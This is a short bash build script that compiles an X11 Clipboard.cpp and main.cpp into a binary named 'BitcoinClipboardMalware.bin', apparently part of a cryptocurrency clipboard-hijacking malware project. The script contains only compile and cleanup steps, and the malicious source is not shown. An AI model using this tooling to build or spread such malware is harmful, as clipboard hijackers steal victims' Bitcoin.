supportedApi=(
    'X11'
)
api=$1
if [[ -z $api ]];
then
	echo "Parameter: api supported"
	exit
fi
apiIsSupported=false
for i in "${supportedApi[@]}"
do
    if [[ "$api" = $i ]]
    then
        apiIsSupported=true
        break
    fi
done

if [ "$apiIsSupported" = false ]
then
    echo $api "is NOT supported. Here's is a list of supported API:"
    echo ${supportedApi[@]}
    exit
fi

cd $api
g++ -c -std=c++14 -Wall -Wextra -pedantic Clipboard.cpp
mv *.o ../
cd ..
g++ -c -std=c++14 -Wall -Wextra -pedantic main.cpp -I"$api"
g++ *.o -o BitcoinClipboardMalware.bin
rm Clipboard.o main.o
